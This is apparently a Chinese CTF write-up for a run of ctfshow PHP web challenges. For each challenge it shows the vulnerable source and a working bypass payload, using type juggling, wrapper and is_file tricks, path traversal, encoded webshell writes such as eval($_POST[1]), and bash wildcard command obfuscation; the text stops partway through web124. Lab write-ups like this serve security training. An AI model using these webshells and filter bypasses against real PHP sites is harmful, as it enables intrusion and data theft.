1?cmd&#x3D;%0Aphp web921234567891011121314&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 科学计数法绕过 : 1234&lt;?phpvar_dump(&#x27;4476e1&#x27;==4476); // bool(false)var_dump(&#x27;4476e1&#x27;==44760); // bool(true)var_dump(intval(&#x27;4476e1&#x27;)); // int(44760) payload: 1?num&#x3D;4476e1 web931234567891011121314151617&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 直接小数 1?num&#x3D;4476.1 web94123456789101112131415161718&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; payload: 1?num&#x3D;4476.0 web95123456789101112131415161718&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123; die(&quot;no no no!!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!!!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 看下intval函数手册： 因此我们可以用八进制，4476的八进制是10574 payload: 1?num&#x3D; 010574 web96123456789101112&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;u&#x27;]))&#123; if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123; die(&quot;no no no&quot;); &#125;else&#123; highlight_file($_GET[&#x27;u&#x27;]); &#125;&#125; 跳一下目录就行 1?u&#x3D;..&#x2F;html&#x2F;flag.php web971234567891011&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))echo $flag;elseprint &#x27;Wrong.&#x27;;&#125;?&gt; payload: 1a[]&#x3D;1&amp;b[]&#x3D;2 web9812345678&lt;?phpinclude(&quot;flag.php&quot;);$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);?&gt; 大概意思就是，是否设置GET参数，有的话GET就是POST的指针，否则$GET=flag payload: 123?1&#x3D;POST: HTTP_FLAG&#x3D;flag web9912345678910&lt;?phphighlight_file(__FILE__);$allow = array();for ($i=36; $i &lt; 0x36d; $i++) &#123; array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123; file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);&#125;?&gt; in_arry函数： 123456&lt;?php$allow1 = array(10,20);var_dump(in_array(&#x27;10.php&#x27;,$allow1)); // bool(true)$allow2 = array(&#x27;a&#x27;,&#x27;b&#x27;);var_dump(in_array(0,$allow2)); // bool(true)?&gt; payload: 123?n&#x3D;10.phpPOST: content&#x3D;&lt;?php system(&#39;cat *&#39;);?&gt; web1001234567891011121314151617&lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123; if(!preg_match(&quot;/\\;/&quot;, $v2))&#123; if(preg_match(&quot;/\\;/&quot;, $v3))&#123; eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); &#125; &#125; &#125;?&gt; 注意点： 1is_numeric($v1) and is_numeric($v2) and is_numeric($v3); 当v1满足条件and后面的is_numberic判断可忽略 直接getshell: 1?v1&#x3D;1&amp;v2&#x3D;?&gt;&lt;?php system(&#39;cat *&#39;)?&gt;&amp;v3&#x3D;; 或者获取类中的属性也行 1?v1&#x3D;1&amp;v2&#x3D;var_dump(get_class_vars&amp;v3&#x3D;); md 不知道为啥提交flag不对 需要把0x2d替换成- web10112345678910111213141516171819&lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|[0-9]/&quot;, $v2))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\?|[0-9]/&quot;, $v3))&#123; eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); &#125; &#125; &#125;?&gt; 利用反射API获取类信息 1?v1&#x3D;1&amp;v2&#x3D;echo(new ReflectionClass(&amp;v3&#x3D;)); web10212345678910111213141516&lt;?phphighlight_file(__FILE__);$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123; $s = substr($v2,2); $str = call_user_func($v1,$s); echo $str; file_put_contents($v3,$str);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 这个地方只需要满足第一个判断就行 因为and的算术优先级小于等于 以下从上到下优先级依次降低 1$v4 = is_numeric($v2) and is_numeric($v3); 接着通过call_user_func调用了某个函数 并传参数 后面又写入了文件 只要文件内容可控就可以写入webshell 但是内容必须是数字 因此我们需要调用能把数字转换成字符串的 找了一圈只有hex2bin比较好 测试了下发现&lt;?编码是3c3f 带有字母不行 在写入的时候可以使用伪协议 尝试使用一些编码 发现这样是可以的 但是还是不够 因此我们需要判断哪些base64加密后的字符能用 哪些不能 base64加密使用的是64个可打印ASCII字符（A-Z、a-z、0-9、+、/） 12345678&lt;?php$a = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=&#x27;;for($i=0;$i&lt;strlen($a);$i++)&#123; if(!is_numeric(bin2hex($a[$i])))&#123; echo $a[$i]; &#125;&#125;// jklmnozJKLMNOZ+/= 这些字符不能在base64编码中出现 写个脚本挨个尝试吧 1234567891011121314151617&lt;?php$ban_str = &#x27;jklmnozJKLMNOZ+/=&#x27;;$b = base64_encode(&#x27;&lt;?php $_POST[a]( $_POST[0] ) ; &#x27;);$bb = $b;for($i = 0; $i &lt;strlen($bb); $i++)&#123; if(strpos($ban_str,$bb[$i])==false)&#123; $bb[$i] = &quot; &quot;; &#125;&#125;echo $b;echo &quot;\\n&quot;;echo $bb;echo &quot;\\n&quot;;$a = call_user_func(&#x27;bin2hex&#x27;,$b);echo $a;echo &quot;\\n&quot;;var_dump(is_numeric($a)); payload: 12?v2&#x3D;125044397761484167494352665545395456467377585367674943526655453954564673785853417049447367&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.phpPOST: v1&#x3D;hex2bin 接着访问1.php web1031234567891011121314151617181920&lt;?phphighlight_file(__FILE__);$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123; $s = substr($v2,2); $str = call_user_func($v1,$s); echo $str; if(!preg_match(&quot;/.*p.*h.*p.*/i&quot;,$str))&#123; file_put_contents($v3,$str); &#125; else&#123; die(&#x27;Sorry&#x27;); &#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125; 内容过滤了php 短标签 1234567891011121314151617&lt;?php$ban_str = &#x27;jklmnozJKLMNOZ+/=&#x27;;$b = base64_encode(&#x27;&lt;?=`$_POST[1]`;&#x27;);$bb = $b;for($i = 0; $i &lt;strlen($bb); $i++)&#123; if(strpos($ban_str,$bb[$i])==false)&#123; $bb[$i] = &quot; &quot;; &#125;&#125;echo $b;echo &quot;\\n&quot;;echo $bb;echo &quot;\\n&quot;;$a = call_user_func(&#x27;bin2hex&#x27;,$b);echo $a;echo &quot;\\n&quot;;var_dump(is_numeric($a)); payload: 12?v2&#x3D;125044383959435266554539545646737858574137&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.phpPOST: v1&#x3D;hex2bin web104123456789101112&lt;?phphighlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(sha1($v1)==sha1($v2))&#123; echo $flag; &#125;&#125;?&gt; 数组绕过 web105123456789101112131415161718192021222324&lt;?phphighlight_file(__FILE__);include(&#x27;flag.php&#x27;);error_reporting(0);$error=&#x27;你还想要flag嘛？&#x27;;$suces=&#x27;既然你想要那给你吧！&#x27;;foreach($_GET as $key =&gt; $value)&#123; if($key===&#x27;error&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; $$key=$$value;&#125;foreach($_POST as $key =&gt; $value)&#123; if($value===&#x27;flag&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; $$key=$$value;&#125;if(!($_POST[&#x27;flag&#x27;]==$flag))&#123; die($error);&#125;echo &quot;your are good&quot;.$flag.&quot;\\n&quot;;die($suces);?&gt; 可变变量 123?suces&#x3D;flagPOST: error&#x3D;suces 或者： 123?suces&#x3D;flag&amp;flag&#x3D;1POST: flag&#x3D; web106123456789101112&lt;?phphighlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123; echo $flag; &#125;&#125;?&gt; 数组绕过： 123?v2[]&#x3D;POST: v1[]&#x3D;1 web1071234567891011121314&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v3 = $_GET[&#x27;v3&#x27;]; parse_str($v1,$v2); if($v2[&#x27;flag&#x27;]==md5($v3))&#123; echo $flag; &#125;&#125;?&gt; md5弱比较 payload: 123?v3&#x3D;byGcYPOST: v1&#x3D;%66%6c%61%67%3d%30%65%31%30 web108123456789101112131415&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE) &#123; die(&#x27;error&#x27;);&#125;//只有36d的人才能看到flagif(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123; echo $flag;&#125;?&gt; ereg 00截断 payload: 1?c&#x3D;a%00778 web10912345678910111213&lt;?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123; eval(&quot;echo new $v1($v2());&quot;); &#125;&#125;?&gt; 反射执行方法可以得到phpinfo 1?v1&#x3D;ReflectionFunction&amp;v2&#x3D;phpinfo 注意正则有问题 只要匹配就行 payload: 12?v1&#x3D;ReflectionClass&amp;v2&#x3D;system(&#39;ls&#39;)?v1&#x3D;Exception&amp;v2&#x3D;system(&#39;ls&#39;) web11012345678910111213141516171819&lt;?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v1))&#123; die(&quot;error v1&quot;); &#125; if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v2))&#123; die(&quot;error v2&quot;); &#125; eval(&quot;echo new $v1($v2());&quot;);&#125;?&gt; payload: 1?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd 利用 FilesystemIterator 获取指定目录下的所有文件 http://phpff.com/filesystemiterator https://www.php.net/manual/zh/class.filesystemiterator.php getcwd()函数 获取当前工作目录 web111123456789101112131415161718192021222324252627&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123; eval(&quot;$$v1 = &amp;$$v2;&quot;); var_dump($$v1);&#125;if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v1))&#123; die(&quot;error v1&quot;); &#125; if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v2))&#123; die(&quot;error v2&quot;); &#125; if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123; getFlag($v1,$v2); &#125;&#125;?&gt; payload: 1?v1&#x3D;ctfshow&amp;v2&#x3D;GLOBALS $GLOBALS 引用全局作用域中可用的全部变量 web11212345678910111213141516&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($file)&#123; if(preg_match(&#x27;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123; die(&quot;hacker!&quot;); &#125;else&#123; return $file; &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123; highlight_file(filter($file));&#125;else&#123; echo &quot;hacker!&quot;;&#125; is_file函数可以用伪协议绕： 1234&lt;?phpvar_dump(is_file(&#x27;test.php&#x27;)); // bool(true)var_dump(is_file(&#x27;php://filter/convert.base64-encode/resource=test.php&#x27;)); // bool(false)var_dump(is_file(&#x27;file:///flag&#x27;)); // bool(true) 换个伪协议的编码器就行： 1?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.php 解码只需复制flag那行就行 123&lt;?php$a = &#x27;f$al=gf&quot;al&#123;g591c2251e-ef-e944ca-46-efa83225e27a6&quot;&#125;&#x27;;echo iconv(&quot;UCS-2BE&quot;,&quot;UCS-2LE&quot;,$a); 或者使用其他协议 123php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.phpphp:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.phpcompress.zlib:&#x2F;&#x2F;flag.php web11312345678910111213141516&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($file)&#123; if(preg_match(&#x27;/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123; die(&#x27;hacker!&#x27;); &#125;else&#123; return $file; &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123; highlight_file(filter($file));&#125;else&#123; echo &quot;hacker!&quot;;&#125; 还是继续用伪协议的思路 发现下面可以用 1?file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php 或者使用对软链接的操作上存在一些缺陷，并不会进行多次解析获取真实路径绕过is_file函数 1&#x2F;?file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php web1141234567891011121314151617&lt;?phperror_reporting(0);highlight_file(__FILE__);function filter($file)&#123; if(preg_match(&#x27;/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123; die(&#x27;hacker!&#x27;); &#125;else&#123; return $file; &#125;&#125;$file=$_GET[&#x27;file&#x27;];echo &quot;师傅们居然tql都是非预期 哼！&quot;;if(! is_file($file))&#123; highlight_file(filter($file));&#125;else&#123; echo &quot;hacker!&quot;;&#125; payload: 1?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php web11512345678910111213141516171819202122&lt;?phpinclude(&#x27;flag.php&#x27;);highlight_file(__FILE__);error_reporting(0);function filter($num)&#123; $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num); return $num;&#125;$num=$_GET[&#x27;num&#x27;];if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123; if($num==&#x27;36&#x27;)&#123; echo $flag; &#125;else&#123; echo &quot;hacker!!&quot;; &#125;&#125;else&#123; echo &quot;hacker!!!&quot;;&#125; 考察is_numeric和trim函数在去除预定义字符的不同 is_numeric函数在判断是否为数字之前自动过滤掉前面的空格 \\t \\n \\r \\v \\f等字符 \\v即为垂直制表符 而trim函数 并没有\\f url编码为%0c payload: 1?num&#x3D;%0c36 web116提示lfi 传file参数可以任意文件读取 读源码 12345678910111213&lt;?phperror_reporting(0);function filter($x)&#123; if(preg_match(&#x27;/http|https|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123; die(&#x27;too young too simple sometimes naive!&#x27;); &#125;&#125;$file=isset($_GET[&#x27;file&#x27;])?$_GET[&#x27;file&#x27;]:&quot;5.mp4&quot;;filter($file);header(&#x27;Content-Type: video/mp4&#x27;);header(&quot;Content-Length: $file&quot;);readfile($file);?&gt; 直接读flag.php就行 就离谱 web117123456789101112&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($x)&#123; if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123; die(&#x27;too young too simple sometimes naive!&#x27;); &#125;&#125;$file=$_GET[&#x27;file&#x27;];$contents=$_POST[&#x27;contents&#x27;];filter($file);file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents); 用其他的编码器即可绕过 123&lt;?phpecho iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;).&quot;\\n&quot;;echo iconv(&quot;UCS-2BE&quot;,&quot;UCS-2LE&quot;,&#x27;&lt;?php die();?&gt;?&lt;hp pvela$(P_SO[T]1;)&gt;?&#x27;); payload: 12?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;2.phpPOST: contents&#x3D;?&lt;hp phpipfn(o;)&gt;? web118测了测 发现小写字母全过滤了 大写字母可用 ` () * 也都过滤了 关于bash里一些操作： https://blog.csdn.net/a343315623/article/details/51436889 https://www.cnblogs.com/barrychiao/archive/2012/10/22/2733210.html https://blog.csdn.net/zjysource/article/details/106738296 payload: 1$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.??? 相当于nl flag.php web119PATH不能用了 payload 1$&#123;PWD:$A:$OPTIND&#125;???$&#123;PWD:$A:$OPTIND&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.??? 相当于 1/???/??t ????.??? $&#123;#HOSTNAME&#125;在docker里长度为12 web120源码： 12345678910111213141516171819&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;code&#x27;]))&#123; $code=$_POST[&#x27;code&#x27;]; if(!preg_match(&#x27;/\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\=|\\^|\\*|\\x26|\\%|\\&lt;|\\&gt;|\\&#x27;|\\&quot;|\\`|\\||\\,/&#x27;, $code))&#123; if(strlen($code)&gt;65)&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;; &#125; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;; &#125;&#125;?&gt; payload: 1$&#123;PWD:$A:$OPTIND&#125;???$&#123;PWD:$A:$OPTIND&#125;?$&#123;USER:~A&#125;? ????.??? 相当于 1/???/?a? ????.??? web12112345678910111213141516171819&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;code&#x27;]))&#123; $code=$_POST[&#x27;code&#x27;]; if(!preg_match(&#x27;/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|\\%|\\&lt;|\\&gt;|\\&#x27;|\\&quot;|\\`|\\||\\,/&#x27;, $code))&#123; if(strlen($code)&gt;65)&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;; &#125; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;; &#125;&#125;?&gt; PWD可用 IFS的长度为3 payload: 1$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.??? 相当于 12/???/r?? ????.???/bin/rev flag.php web12212345678910111213141516171819&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;code&#x27;]))&#123; $code=$_POST[&#x27;code&#x27;]; if(!preg_match(&#x27;/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|#|%|\\&gt;|\\&#x27;|\\&quot;|\\`|\\||\\,/&#x27;, $code))&#123; if(strlen($code)&gt;65)&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;; &#125; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;; &#125;&#125;?&gt; HOME可用 取反不能用了 payload: 1&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.??? 相当于 12/???/?????4 ????.???/bin/base64 flag.php 或 /bin/base32 flag.php web123123456789101112131415&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123; eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g===&quot;flag_give_me&quot;)&#123; echo $flag; &#125; &#125;&#125;?&gt; 首先先说下CTF_SHOW.COM 由于php字符串解析特性 正常传的时候会将.解析成_ 参考：https://github.com/php/php-src/blob/master/main/php_variables.c 按照php源码可以传CTF[SHOW.COM绕过 再说下$_SERVER[&#39;argv&#39;] 只有设置设置register_argc_argv = On(默认是Off)的时候 $_SERVER[&#39;argv&#39;]才会有效果 1$_SERVER[&#x27;argv&#x27;][0] = $_SERVER[&#x27;QUERY_STRING&#x27;] flag直接在eval里输出就行 payload: 12POST: fun&#x3D;echo $flag&amp;CTF[SHOW.COM&#x3D;&amp;CTF_SHOW&#x3D; 过滤了= 直接在eval那赋值不行 web12412345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#x27;c&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET[&#x27;c&#x27;]; if (strlen($content) &gt;= 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, 